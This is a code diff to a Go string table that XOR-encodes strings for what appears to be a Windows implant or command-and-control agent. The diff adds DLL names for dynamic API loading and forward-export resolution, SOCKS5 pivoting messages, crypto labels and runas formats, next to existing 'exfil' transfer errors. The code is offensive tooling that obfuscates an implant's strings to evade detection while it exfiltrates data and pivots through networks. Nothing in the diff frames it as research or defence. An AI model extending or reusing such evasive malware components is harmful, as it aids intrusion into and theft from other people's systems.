@@ -77,6 +77,8 @@ var baseEntries = []entry{
 	{"REG_HIVE_HKU",     "HKU\\",                                                   false},
 
 	/* DLL names for LoadLibraryA in dynapi.c */
+	{"DLL_KERNEL32",     "kernel32.dll",                                            true},
+	{"DLL_KERNEL32_A",   "kernel32.dll",                                            false},
 	{"DLL_WINHTTP",      "winhttp.dll",                                             false},
 	{"DLL_BCRYPT",       "bcrypt.dll",                                               false},
 	{"DLL_CRYPT32",      "crypt32.dll",                                              false},
@@ -85,6 +87,7 @@ var baseEntries = []entry{
 	{"DLL_IPHLPAPI",     "iphlpapi.dll",                                             false},
 	{"DLL_DNSAPI",       "dnsapi.dll",                                               false},
 	{"DLL_NETAPI32",     "netapi32.dll",                                             false},
+	{"DLL_WS2_32",       "ws2_32.dll",                                              false},
 
 	/* ls */
 	{"LS_ERR_ACCESS",    "ls: cannot access '%s' (error %lu)\r\n",                  false},
@@ -277,6 +280,30 @@ var baseEntries = []entry{
 	/* transfer */
 	{"EXFIL_ERR_OPEN",     "exfil: open failed (0x%08lx)\r\n",                      false},
 	{"EXFIL_ERR_READ",     "exfil: read failed (0x%08lx)\r\n",                      false},
+
+	// SOCKS5 pivoting
+	{"SOCKS_CONNECT_FAIL", "socks: connect failed", false},
+	{"SOCKS_RESOLVE_FAIL", "socks: resolve failed", false},
+	{"SOCKS_SLOTS_FULL",   "socks: no free channels", false},
+
+	/* crypto labels */
+	{"CRYPTO_AES_CBC",     "aes-cbc",          false},
+	{"CRYPTO_HMAC_SHA256", "hmac-sha256",       false},
+
+	/* exec / runas */
+	{"FMT_PID_EXIT",       "pid=%lu exit=%lu",  false},
+
+	/* ls pattern strings */
+	{"DIR_WILDCARD",        ".\\*",             false},
+	{"DIR_FMT_STAR",        "%s*",              false},
+	{"DIR_FMT_BSLASH_STAR", "%s\\*",            false},
+
+	/* ls dot-skip strings */
+	{"DOT",    ".",   false},
+	{"DOTDOT", "..", false},
+
+	/* DLL extension for forward-export resolution */
+	{"DLL_EXT", ".dll", false},
 }
 
 // EncodeNarrow XOR-encodes a narrow (ASCII/UTF-8) string.
